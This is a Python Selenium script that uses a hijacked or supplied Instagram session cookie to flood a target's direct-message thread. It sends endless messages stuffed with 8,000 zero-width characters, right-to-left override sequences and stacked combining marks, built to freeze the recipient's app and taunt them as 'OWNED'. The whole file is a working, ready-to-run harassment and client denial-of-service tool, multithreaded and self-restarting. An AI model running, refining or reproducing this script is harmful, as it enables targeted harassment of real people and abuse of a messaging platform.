# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (8000 BLOAT EDITION)
# 📅 STATUS: RED-LINE IMPACT | DYNAMIC NAME

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIG ---
THREADS = 2
SESSION_LIMIT = 120 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_max_payload(target_display_name):
    """The Red-Line Payload: 8,000 character bloat + Skyscrapers."""
    header = "👑 PRAVEER PAPA 👑\n"
    sub_header = f"SYSTEM ERROR: [{target_display_name.upper()}] HAS BEEN OWNED\n"
    
    direction_chaos = ("\u202E" + "\u202D") * 150 
    z_tower = "̸" * 120
    # 💥 RED-LINE BLOAT (8,000 chars)
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(8000))
    
    lines = [header, sub_header, bloat]
    for _ in range(60):
        lines.append(direction_chaos + f"{target_display_name.upper()}_OWNED" + z_tower)
    
    lines.append(bloat + "\n🛑 SYSTEM UNRESPONSIVE 🛑")
    return "\n".join(lines)

def log_status(agent_id, msg):
    print(f"[M{MACHINE_ID}-A{agent_id}] {msg}", flush=True)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_display_name):
    while True:
        driver = None
        session_start = time.time()
        try:
            log_status(agent_id, "🚀 DEPLOYING RED-LINE AGENT...")
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(10)

            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    driver.execute_script("""
                        var el = arguments[0];
                        document.execCommand('insertText', false, arguments[1]);
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                    """, box, get_max_payload(target_display_name))
                    box.send_keys(Keys.ENTER)
                    log_status(agent_id, f"🔥 IMPACT SENT | {target_display_name.upper()} FREEZING")
                    time.sleep(0.8)
                except: time.sleep(3)
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS): executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
